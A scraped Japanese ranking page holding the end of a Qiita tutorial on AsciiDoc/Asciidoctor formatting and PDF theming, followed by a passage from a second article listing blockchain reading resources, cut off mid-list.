<p><a href="https://camo.qiitausercontent.com/489de8c4f4b3b078a35d429dff30c4e93906fb6a/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f31303836322f37633333623730372d363932332d646566342d343065342d3363613031656161663262352e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/489de8c4f4b3b078a35d429dff30c4e93906fb6a/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f31303836322f37633333623730372d363932332d646566342d343065342d3363613031656161663262352e706e67" alt="image.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/10862/7c33b707-6923-def4-40e4-3ca01eaaf2b5.png"></a></p>

<p><code>:icons: font</code>を記述すると表示される</p>

<div class="code-frame" data-lang="adoc">
<div class="code-lang"><span class="bold">icon-font.adoc</span></div>
<div class="highlight"><pre><span></span>
:icons: font

[NOTE]
====
* デフォルトでは[NOTE]が出ません
====

[CAUTION]
====
* デフォルトでは[CAUTION]が出ません
====
</pre></div>
</div>

<p><a href="https://camo.qiitausercontent.com/e244216804ec050f295149b10950c35c1cbb96e6/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f31303836322f65616263346562382d326431342d373765312d646536382d3235346633356461376538332e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/e244216804ec050f295149b10950c35c1cbb96e6/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f31303836322f65616263346562382d326431342d373765312d646536382d3235346633356461376538332e706e67" alt="image.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/10862/eabc4eb8-2d14-77e1-de68-254f35da7e83.png"></a></p>

<h3>
<span id="バージョン最終更新日などを表示する" class="fragment"></span><a href="#%E3%83%90%E3%83%BC%E3%82%B8%E3%83%A7%E3%83%B3%E6%9C%80%E7%B5%82%E6%9B%B4%E6%96%B0%E6%97%A5%E3%81%AA%E3%81%A9%E3%82%92%E8%A1%A8%E7%A4%BA%E3%81%99%E3%82%8B"><i class="fa fa-link"></i></a>バージョン、最終更新日などを表示する</h3>

<p><code>:author:</code>, <code>:revnumber:</code>, <code>:revdate:</code>を定義する。</p>

<div class="code-frame" data-lang="adoc">
<div class="code-lang"><span class="bold">revnumber.adoc</span></div>
<div class="highlight"><pre><span></span>:author: asciidoc事業部 開発１グループ
:revnumber: 0.1
:revdate: 2017/10/25

= asciidocの使い方
</pre></div>
</div>

<ul>
<li>HTMLの場合（一番上に表示）</li>
</ul>

<p><a href="https://camo.qiitausercontent.com/694229efc32e821d80f047ae8e3a894a243961c4/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f31303836322f33343134656165642d363666652d303536642d356139392d3561346263633834393632652e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/694229efc32e821d80f047ae8e3a894a243961c4/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f31303836322f33343134656165642d363666652d303536642d356139392d3561346263633834393632652e706e67" alt="image.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/10862/3414eaed-66fe-056d-5a99-5a4bcc84962e.png"></a></p>

<ul>
<li>PDFの場合（表紙に表示）</li>
</ul>

<p><a href="https://camo.qiitausercontent.com/ba1391db767a6e68bb5b83314262a90802b38de2/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f31303836322f34316530646436362d626230622d316537352d396666642d3838386131386334393834332e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/ba1391db767a6e68bb5b83314262a90802b38de2/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f31303836322f34316530646436362d626230622d316537352d396666642d3838386131386334393834332e706e67" alt="image.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/10862/41e0dd66-bb0b-1e75-9ffd-888a18c49843.png"></a></p>

<h3>
<span id="plantumlなどを記述する" class="fragment"></span><a href="#plantuml%E3%81%AA%E3%81%A9%E3%82%92%E8%A8%98%E8%BF%B0%E3%81%99%E3%82%8B"><i class="fa fa-link"></i></a>PlantUMLなどを記述する</h3>

<p>PlantUML(テキストでUMLを記述できるツール）を埋め込むことが可能</p>

<div class="code-frame" data-lang="adoc">
<div class="code-lang"><span class="bold">plantuml.adoc</span></div>
<div class="highlight"><pre><span></span>.シーケンス図
[plantuml]
----
actor ユーザー as user
user -&gt; ログイン : ログインする
ログイン --&gt; user:
----

.クラス図
[plantuml]
----
class Animal {
  int age
  run()
}

class Cat extends Animal {
}

class Dog extends Animal {
}
----
</pre></div>
</div>

<p><a href="https://camo.qiitausercontent.com/17c9eeb6e3aaa14ffc3f4dfa3569888a4b58866b/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f31303836322f61366635306337612d346661632d616432382d666432622d3833633832666534353633362e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/17c9eeb6e3aaa14ffc3f4dfa3569888a4b58866b/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f31303836322f61366635306337612d346661632d616432382d666432622d3833633832666534353633362e706e67" alt="image.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/10862/a6f50c7a-4fac-ad28-fd2b-83c82fe45636.png"></a></p>

<ul>
<li>
<code>asciidoc-diagram</code>を使っているので、PDF/HTML変換時は指定しないと表示されない</li>
</ul>

<div class="code-frame" data-lang="text"><div class="highlight"><pre><span></span>asciidoctor -r asciidoctor-diagram sample.asoc
</pre></div></div>

<ul>
<li>PlantUML以外にも<code>ditaa</code>、<code>graphviz</code>などにも対応</li>
</ul>

<h3>
<span id="例表画像に説明文キャプションを付ける" class="fragment"></span><a href="#%E4%BE%8B%E8%A1%A8%E7%94%BB%E5%83%8F%E3%81%AB%E8%AA%AC%E6%98%8E%E6%96%87%E3%82%AD%E3%83%A3%E3%83%97%E3%82%B7%E3%83%A7%E3%83%B3%E3%82%92%E4%BB%98%E3%81%91%E3%82%8B"><i class="fa fa-link"></i></a>例・表・画像に説明文（キャプション）を付ける</h3>

<p>example, table, imageなどにはその上に<code>.&lt;文字&gt;</code>をつけることで、説明文をつけることができる（ナンバリングもされる）<br>
<code>:example-caption:</code>、<code>:table-caption:</code>で、<code>:figure-caption:</code>、プレフィックスも指定可能</p>

<div class="code-frame" data-lang="adoc">
<div class="code-lang"><span class="bold">example-caption.adoc</span></div>
<div class="highlight"><pre><span></span>:example-caption: 例

.参考
====
asciidocの例です

====

.参考
====
asciidocの例です２
====
</pre></div>
</div>

<p><a href="https://camo.qiitausercontent.com/f8d1dbc323ec64efa87c5eb69d680195d35604e2/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f31303836322f36646138663266352d656535662d646564372d326264622d6464373532363939633738642e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/f8d1dbc323ec64efa87c5eb69d680195d35604e2/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f31303836322f36646138663266352d656535662d646564372d326264622d6464373532363939633738642e706e67" alt="image.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/10862/6da8f2f5-ee5f-ded7-2bdb-dd752699c78d.png"></a></p>

<div class="code-frame" data-lang="adoc">
<div class="code-lang"><span class="bold">table-caption.adoc</span></div>
<div class="highlight"><pre><span></span>:table-caption: 表

.OS一覧
|======
|No|OS
|1|Windows
|2|Linux
|======

.OS一覧
|======
|No|OS
|1|Android
|2|iOS
|======
</pre></div>
</div>

<p><a href="https://camo.qiitausercontent.com/554a7904274b9a3b96c54657bc953f3bf2a43e58/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f31303836322f30343834326561312d623063642d366461372d346339302d6334616638323331313834382e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/554a7904274b9a3b96c54657bc953f3bf2a43e58/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f31303836322f30343834326561312d623063642d366461372d346339302d6334616638323331313834382e706e67" alt="image.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/10862/04842ea1-b0cd-6da7-4c90-c4af82311848.png"></a></p>

<div class="code-frame" data-lang="adoc">
<div class="code-lang"><span class="bold">image-caption.adoc</span></div>
<div class="highlight"><pre><span></span>
:figure-caption: 図

.脚注(NOTE)
image::icon_note.jpg[]
</pre></div>
</div>

<p><a href="https://camo.qiitausercontent.com/7275fdd45f49646914d1c07d3a965e425652f2d7/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f31303836322f33336363626662322d343564652d613334322d306164342d3638323161306331663363352e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/7275fdd45f49646914d1c07d3a965e425652f2d7/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f31303836322f33336363626662322d343564652d613334322d306164342d3638323161306331663363352e706e67" alt="image.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/10862/33ccbfb2-45de-a342-0ad4-6821a0c1f3c5.png"></a></p>

<h3>
<span id="ファイルを取り込む" class="fragment"></span><a href="#%E3%83%95%E3%82%A1%E3%82%A4%E3%83%AB%E3%82%92%E5%8F%96%E3%82%8A%E8%BE%BC%E3%82%80"><i class="fa fa-link"></i></a>ファイルを取り込む</h3>

<p><code>include::</code>を使用することで別ファイルを取り込むことができる<br>
adocファイルが大きくなって分割したい時や、csvやソースなどadocとは別ファイルを管理したい時に便利</p>

<div class="code-frame" data-lang="adoc">
<div class="code-lang"><span class="bold">include.adoc</span></div>
<div class="highlight"><pre><span></span>// adocファイルの取込み
include::other.adoc

// csvをテーブルに取込み
[format="csv"]
|===
include::_includes/other.csv[]
|===

// ソースコードを取込み
[source,ruby]
----
include::_includes/other.rb[]
----

// PlantUMLを取込み
[plantuml]
----
include::_includes/sequence.puml[]
----

</pre></div>
</div>

<p><code>lindes</code>でincludeする範囲を指定したり、<code>:includedir:</code>でincludeするフォルダをまとめて指定することも可能</p>

<div class="code-frame" data-lang="adoc">
<div class="code-lang"><span class="bold">lines.adoc</span></div>
<div class="highlight"><pre><span></span>:includedir: _includes

// _includes/other.csvの1～3行目を表示
[format="csv"]
|===
include::{includedir}/other.csv[lines=1..3]
|===

</pre></div>
</div>

<h3>
<span id="htmlのスタイルcssを設定する" class="fragment"></span><a href="#html%E3%81%AE%E3%82%B9%E3%82%BF%E3%82%A4%E3%83%ABcss%E3%82%92%E8%A8%AD%E5%AE%9A%E3%81%99%E3%82%8B"><i class="fa fa-link"></i></a>HTMLのスタイル(CSS)を設定する</h3>

<p><code>:stylesdir:</code>でCSSのフォルダを<code>:stylesheet:</code>でCSSファイルを指定可能</p>

<div class="code-frame" data-lang="adoc">
<div class="code-lang"><span class="bold">html-style.adoc</span></div>
<div class="highlight"><pre><span></span>:stylesdir: stylesheets/
:stylesheet: asciidoctor-default.css
</pre></div>
</div>

<p>何も指定していないとき、Windowsの場合は以下に入っているので、cssファイルをコピーして編集すると良い</p>

<div class="code-frame" data-lang="text"><div class="highlight"><pre><span></span># ruby2.4で、ascidoctorのバージョンが1.5.6.1の場合
C:\Ruby24\lib\ruby\gems\2.4.0\gems\asciidoctor-1.5.6.1\data\stylesheets\asciidoctor-default.css
</pre></div></div>

<h3>
<span id="pdfのスタイルを設定する" class="fragment"></span><a href="#pdf%E3%81%AE%E3%82%B9%E3%82%BF%E3%82%A4%E3%83%AB%E3%82%92%E8%A8%AD%E5%AE%9A%E3%81%99%E3%82%8B"><i class="fa fa-link"></i></a>PDFのスタイルを設定する</h3>

<p>PDFのスタイルは設定ファイル(yaml)として定義する<br>
<code>:pdf-style:</code>で設定ファイルの指定が可能</p>

<div class="code-frame" data-lang="adoc">
<div class="code-lang"><span class="bold">pdf-style.adoc</span></div>
<div class="highlight"><pre><span></span>:pdf-style: themes/default-theme.yml
</pre></div>
</div>

<p>何も指定していないとき、Windowsの場合は以下に入っているので、yamlファイルをコピーして編集すると良い</p>

<div class="code-frame" data-lang="text"><div class="highlight"><pre><span></span># ruby2.4で、ascidoctor-pdfのバージョンが1.5.0.alpha16の場合
C:\Ruby24\lib\ruby\gems\2.4.0\gems\asciidoctor-pdf-1.5.0.alpha.16\data\themes\default-theme.yml
</pre></div></div>

<h3>
<span id="pdfのフッタにcopyrightを入れる" class="fragment"></span><a href="#pdf%E3%81%AE%E3%83%95%E3%83%83%E3%82%BF%E3%81%ABcopyright%E3%82%92%E5%85%A5%E3%82%8C%E3%82%8B"><i class="fa fa-link"></i></a>PDFのフッタに「Copyright」を入れる</h3>

<p>企業のドキュメントなどは「Copyright」表記を入れることが多いので、<br>
pdfのスタイル設定のフッタに記述することで対応可能</p>

<div class="code-frame" data-lang="adoc">
<div class="code-lang"><span class="bold">test.adoc</span></div>
<div class="highlight"><pre><span></span>:pdf-style: themes/default-theme.yml
</pre></div>
</div>

<div class="code-frame" data-lang="yaml">
<div class="code-lang"><span class="bold">default-theme.yml</span></div>
<div class="highlight"><pre><span></span><span class="l l-Scalar l-Scalar-Plain">footer</span><span class="p p-Indicator">:</span>
  <span class="l l-Scalar l-Scalar-Plain">font_size</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">$base_font_size_small</span>
  <span class="l l-Scalar l-Scalar-Plain">border_color</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">dddddd</span>
  <span class="l l-Scalar l-Scalar-Plain">border_width</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">0.25</span>
  <span class="l l-Scalar l-Scalar-Plain">height</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">$base_line_height_length * 2.5</span>
  <span class="l l-Scalar l-Scalar-Plain">line_height</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">1</span>
  <span class="l l-Scalar l-Scalar-Plain">padding</span><span class="p p-Indicator">:</span> <span class="p p-Indicator">[</span><span class="nv">$base_line_height_length / 2</span><span class="p p-Indicator">,</span> <span class="nv">1</span><span class="p p-Indicator">,</span> <span class="nv">0</span><span class="p p-Indicator">,</span> <span class="nv">1</span><span class="p p-Indicator">]</span>
  <span class="l l-Scalar l-Scalar-Plain">vertical_align</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">top</span>
  <span class="l l-Scalar l-Scalar-Plain">recto</span><span class="p p-Indicator">:</span>
    <span class="l l-Scalar l-Scalar-Plain">right</span><span class="p p-Indicator">:</span>
      <span class="l l-Scalar l-Scalar-Plain">content</span><span class="p p-Indicator">:</span> <span class="s">'{page-number}</span><span class="nv"> </span><span class="s">/</span><span class="nv"> </span><span class="s">{page-count}'</span>
    <span class="l l-Scalar l-Scalar-Plain">center</span><span class="p p-Indicator">:</span>
      <span class="l l-Scalar l-Scalar-Plain">content</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">Copyright (C) adoc company CO.,LTD. All right reserved.</span>
  <span class="l l-Scalar l-Scalar-Plain">verso</span><span class="p p-Indicator">:</span>
    <span class="l l-Scalar l-Scalar-Plain">right</span><span class="p p-Indicator">:</span>
      <span class="l l-Scalar l-Scalar-Plain">content</span><span class="p p-Indicator">:</span> <span class="s">'{page-number}</span><span class="nv"> </span><span class="s">/</span><span class="nv"> </span><span class="s">{page-count}'</span>
    <span class="l l-Scalar l-Scalar-Plain">center</span><span class="p p-Indicator">:</span>
      <span class="l l-Scalar l-Scalar-Plain">content</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">Copyright (C) adoc company CO.,LTD. All right reserved.</span>
</pre></div>
</div>

<p><a href="https://camo.qiitausercontent.com/ecea1634a222dc94b1ce2ad7999f90bf82257518/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f31303836322f39343337343364612d663966322d393365622d393761372d6533623664663565343261612e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/ecea1634a222dc94b1ce2ad7999f90bf82257518/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f31303836322f39343337343364612d663966322d393365622d393761372d6533623664663565343261612e706e67" alt="image.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/10862/943743da-f9f2-93eb-97a7-e3b6df5e42aa.png"></a></p>

<h3>
<span id="半角全角が混じるとスペースがおかしくなるasciidoctor-pdf" class="fragment"></span><a href="#%E5%8D%8A%E8%A7%92%E5%85%A8%E8%A7%92%E3%81%8C%E6%B7%B7%E3%81%98%E3%82%8B%E3%81%A8%E3%82%B9%E3%83%9A%E3%83%BC%E3%82%B9%E3%81%8C%E3%81%8A%E3%81%8B%E3%81%97%E3%81%8F%E3%81%AA%E3%82%8Basciidoctor-pdf"><i class="fa fa-link"></i></a>半角・全角が混じるとスペースがおかしくなる(asciidoctor-pdf)</h3>

<p>半角・全角が混じるとスペースがおかしくなる。</p>

<ul>
<li>スペースがおかしい例</li>
</ul>

<p><a href="https://camo.qiitausercontent.com/e909d1f930f7615bcc9c42347e430a43d3d3da35/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f31303836322f64346638386436392d316266352d666362312d656137632d3836326333363436353361662e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/e909d1f930f7615bcc9c42347e430a43d3d3da35/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f31303836322f64346638386436392d316266352d666362312d656137632d3836326333363436353361662e706e67" alt="image.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/10862/d4f88d69-1bf5-fcb1-ea7c-862c364653af.png"></a></p>

<p>対策としては、「asciidoctor-pdf-cjk」を入れると大体解消</p>

<div class="code-frame" data-lang="text"><div class="highlight"><pre><span></span>gem install asciidoctor-pdf-cjk
</pre></div></div>

<p>さらに、PDF変換のときに「-r asciidoctor-pdf-cjk」指定しないといけない</p>

<div class="code-frame" data-lang="text"><div class="highlight"><pre><span></span>asciidoctor-pdf -r asciidoctor-pdf-cjk test.asc
</pre></div></div>

<ul>
<li>適用後の例</li>
</ul>

<p><a href="https://camo.qiitausercontent.com/1865e2fa2597269db9e810539b5e38b4b230b3b4/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f31303836322f38376331346238332d386263302d643061322d623633642d3865633831666632623965302e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/1865e2fa2597269db9e810539b5e38b4b230b3b4/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f31303836322f38376331346238332d386263302d643061322d623633642d3865633831666632623965302e706e67" alt="image.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/10862/87c14b83-8bc0-d0a2-b63d-8ec81ff2b9e0.png"></a></p>

<h2>
<span id="asciidoctor-pdfの課題" class="fragment"></span><a href="#asciidoctor-pdf%E3%81%AE%E8%AA%B2%E9%A1%8C"><i class="fa fa-link"></i></a>asciidoctor-pdfの課題</h2>

<h3>
<span id="文字の色が変えられない" class="fragment"></span><a href="#%E6%96%87%E5%AD%97%E3%81%AE%E8%89%B2%E3%81%8C%E5%A4%89%E3%81%88%E3%82%89%E3%82%8C%E3%81%AA%E3%81%84"><i class="fa fa-link"></i></a>文字の色が変えられない</h3>

<ul>
<li>asiciidoctor-pdfのバグ？</li>
</ul>

<h3>
<span id="が表示されない" class="fragment"></span><a href="#%E3%81%8C%E8%A1%A8%E7%A4%BA%E3%81%95%E3%82%8C%E3%81%AA%E3%81%84"><i class="fa fa-link"></i></a>「※」が表示されない</h3>

<p>デフォルトフォントに「※」が入っていない。<br>
fontsフォルダに「※」が入ったフォントファイルを入れればＯＫ</p>

<ul>
<li>HTML(※が出る）</li>
</ul>

<p><a href="https://camo.qiitausercontent.com/aacfb0b2bf55b36b73a4e306d4e39afd0a2c8030/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f31303836322f64666530643438372d613535322d653266642d376465342d3264313063316464623433652e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/aacfb0b2bf55b36b73a4e306d4e39afd0a2c8030/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f31303836322f64666530643438372d613535322d653266642d376465342d3264313063316464623433652e706e67" alt="image.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/10862/dfe0d487-a552-e2fd-7de4-2d10c1ddb43e.png"></a></p>

<ul>
<li>PDF(※が出ない）</li>
</ul>

<p><a href="https://camo.qiitausercontent.com/2f4d79b4e276a68e7eaa141acc68c1267b91b818/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f31303836322f32613966363935312d313363652d363735662d623432302d6663353238343261613761312e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/2f4d79b4e276a68e7eaa141acc68c1267b91b818/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f31303836322f32613966363935312d313363652d363735662d623432302d6663353238343261613761312e706e67" alt="image.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/10862/2a9f6951-13ce-675f-b420-fc52842aa7a1.png"></a></p>

<h2>
<span id="参考資料" class="fragment"></span><a href="#%E5%8F%82%E8%80%83%E8%B3%87%E6%96%99"><i class="fa fa-link"></i></a>参考資料</h2>

<ul>
<li><a href="https://takumon.github.io/asciidoc-syntax-quick-reference-japanese-translation/" rel="nofollow noopener" target="_blank">Asciidoctor クリックリファレンス（日本語）</a></li>
<li><a href="http://asciidoctor.org/docs/user-manual/" rel="nofollow noopener" target="_blank">Asciidoctor User Manual</a></li>
<li><a href="https://github.com/asciidoctor/asciidoctor-pdf" rel="nofollow noopener" target="_blank">Asciidoctor pdf</a></li>
</ul>
</div>
	</td>
</tr>
</table>
<br />
<table border="1" style="height:150px;">
<tr>
	<td rowspan="3">42位</td>
	<td colspan="4">
		<kbd><i><img alt="いいね" width="16" height="16" src="thumb-up-120px.png" /></i>236</kbd>
		<a target="_blank" href="https://qiita.com/onokatio/items/7db58947b05c17d1f44e">とりあえずド素人が読むべきブロックチェーン論文・書籍・サイト</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2017-11-09<br />21:56:49</center>
	</td>
	<td style="width:200px;">
		<!--投稿者-->
		<center>
			@<a href="user/154157.html">onokatio</a>(40件の記事)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/154157/profile-images/1503882654">
		</center>
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[Bitcoin]</b> <b>[Blockchain]</b> <b>[ビットコイン]</b> <b>[ブロックチェーン]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;"><p>どうも。よくブロックチェーン興味あるけどよくわからん、という声を某所から聞くので、僭越ながら自分が勉強するために使っている参考文献を紹介します。<br>
今後自分が新しく読むたびに追加していく予定です。</p>

<h2>
<span id="共通必須" class="fragment"></span><a href="#%E5%85%B1%E9%80%9A%E5%BF%85%E9%A0%88"><i class="fa fa-link"></i></a>共通,必須</h2>

<h3>
<span id="mastering-bitcoin-書籍" class="fragment"></span><a href="#mastering-bitcoin-%E6%9B%B8%E7%B1%8D"><i class="fa fa-link"></i></a>Mastering Bitcoin (書籍)</h3>

<p><a href="https://www.bitcoinbook.info/translations-of-mastering-bitcoin/" class="autolink" rel="nofollow noopener" target="_blank">https://www.bitcoinbook.info/translations-of-mastering-bitcoin/</a></p>

<p>名著中の名著ですね。主にビットコインのブロックチェーンに関する一通りの説明が乗っています。業界では読んでいることが常識と呼ばれるくらいに一般的な書籍となっています。<br>
全部目を通しておいて損はないと思われます。<br>
自分の場合は、本を買わずに、拝みながら無償翻訳版(上記URL)を読ませてもらっていますが、そろそろ手元に置いておきたいところです。</p>

<h2>
<span id="bitcoin-関連" class="fragment"></span><a href="#bitcoin-%E9%96%A2%E9%80%A3"><i class="fa fa-link"></i></a>Bitcoin 関連</h2>

<h3>
<span id="enbitcoinit" class="fragment"></span><a href="#enbitcoinit"><i class="fa fa-link"></i></a>en.bitcoin.it</h3>

<p><a href="https://en.bitcoin.it/wiki/Main_Page" class="autolink" rel="nofollow noopener" target="_blank">https://en.bitcoin.it/wiki/Main_Page</a></p>

<p>有名なBitcoinのWikiです。トランザクションの構造や、データベースの保存形式など、技術に関する細かい説明が掲載されています。Mastering Bitcoinで理論を学んだあと、実際に作業で使うのは主にこちらになっています。情報の新しさという面で、本よりも最新な点もGOODです。</p>

<h3>
<span id="bitcoin-improvement-proposals-bip" class="fragment"></span><a href="#bitcoin-improvement-proposals-bip"><i class="fa fa-link"></i></a>Bitcoin Improvement Proposals (BIP)</h3>

<p><a href="https://en.bitcoin.it/wiki/Bitcoin_Improvement_Proposals" class="autolink" rel="nofollow noopener" target="_blank">https://en.bitcoin.it/wiki/Bitcoin_Improvement_Proposals</a></p>

<p>BIPと呼ばれる、ビットコインの改善を文章化したものです。ビットコインのプロトコル追加案は基本的にこれに則っています。常にビットコインに取り込まれている最新の仕様が、一番根本のソースで確認できるので、本やWikiに比べると一番わかりやすく信頼できる情報源です。</p>

<p>自分は、BIPの翻訳をしているので、よければ参考にしてください。</p>

<p><a href="https://qiita.com/onokatio/items/60020144786edd42a656" id="reference-e5511058831f9443b5e5">BIP 0001 【ビットコイン番RFCである"Bitcoin Improvement Proposal"を読んでみよう】<br>
</a><br>
<a href="https://qiita.com/onokatio/items/4eafe6b26cf6820de945" id="reference-dc5349368e6175de024d">BIP 0012 (OP_EVAL) 【任意の値をScriptとして実行できる】<br>
</a></p>

<h2>
<span id="lightning-network" class="fragment"></span><a href="#lightning-network"><i class="fa fa-link"></i></a>Lightning Network</h2>

<p><a href="http://lightning.network/lightning-network-paper.pdf" class="autolink" rel="nofollow noopener" target="_blank">http://lightning.network/lightning-network-paper.pdf</a></p>

<p>数あるライトニングネットワークの構想ですが、その1つであるlightningnetworkグループが出しているホワイトペーパーです。</p>

<h2>
<span id="ethereum-関連" class="fragment"></span><a href="#ethereum-%E9%96%A2%E9%80%A3"><i class="fa fa-link"></i></a>Ethereum 関連</h2>

<h3>
<span id="ethereum-wiki" class="fragment"></span><a href="#ethereum-wiki"><i class="fa fa-link"></i></a>Ethereum Wiki</h3>

<p><a href="http://www.ethdocs.org/en/latest/" class="autolink" rel="nofollow noopener" target="_blank">http://www.ethdocs.org/en/latest/</a><br>
<a href="https://github.com/ethereum/wiki/wiki" class="autolink" rel="nofollow noopener" target="_blank">https://github.com/ethereum/wiki/wiki</a></p>

<p>コアデブが公開しているwikiです。Ethereumのホワイトペーパー、イエローペーパー、その他細かい説明が全て乗っています。Ethereum自体の基本的な仕組み・原理を学ぶにはもってこいです。</p>

<h3>
<span id="solidity" class="fragment"></span><a href="#solidity"><i class="fa fa-link"></i></a>Solidity</h3>

<p><a href="https://solidity.readthedocs.io/en/latest/" class="autolink" rel="nofollow noopener" target="_blank">https://solidity.readthedocs.io/en/latest/</a></p>

<p>スマートコントラクトを開発するための言語、Solidityのドキュメントです。</p>

<h3>
<span id="ethereum-book" class="fragment"></span><a href="#ethereum-book"><i class="fa fa-link"></i></a>Ethereum Book</h3>

<p><a href="https://book.ethereum-jp.net/" class="autolink" rel="nofollow noopener" target="_blank">https://book.ethereum-jp.net/</a></p>

<p>Ethereumでスマートコントラクトを開発するためのドキュメントを、日本語に翻訳したものです。日本語なので内容もわかりやすいのですが、唯一情報が古い＆wikiに比べると少ないという問題があります。<br>
自分の場合は、まずこれを呼んで、その上でwikiを読むことでスムーズに理解できました。</p>

<h3>
<span id="eip" class="fragment"></span><a href="#eip"><i class="fa fa-link"></i></a>EIP</h3>

<p><a href="https://github.com/ethereum/EIPs" class="autolink" rel="nofollow noopener" target="_blank">https://github.com/ethereum/EIPs</a></p>

<p>Ethereum版BIPである、EIPのリポジトリです。ERC20 トークンなどの仕様が保管されています。</p>

<h3>
<span id="ethereum-smart-contract-best-practices" class="fragment"></span><a href="#ethereum-smart-contract-best-practices"><i class="fa fa-link"></i></a>Ethereum Smart Contract Best Practices</h3>

<p><a href="https://consensys.github.io/smart-contract-best-practices/" class="autolink" rel="nofollow noopener" target="_blank">https://consensys.github.io/smart-contract-best-practices/</a></p>

<p>スマートコントラクトを開発する際に、気をつけるべき点や脆弱性、問題点などがわかりやすくまとめられています。</p>

<h3>
<span id="web3js-docs" class="fragment"></span><a href="#web3js-docs"><i class="fa fa-link"></i></a>Web3.js docs</h3>

<p><a href="https://web3js.readthedocs.io/en/1.0/" class="autolink" rel="nofollow noopener" target="_blank">https://web3js.readthedocs.io/en/1.0/</a></p>

<p>Ethereumを使った非中央集権なサービスを開発するためのライブラリ、Web3.jsのreaddocsです。Getting StartedやAPIリファレンスが乗っています。</p>

<h3>
<span id="ens" class="fragment"></span><a href="#ens"><i class="fa fa-link"></i></a>ENS</h3>

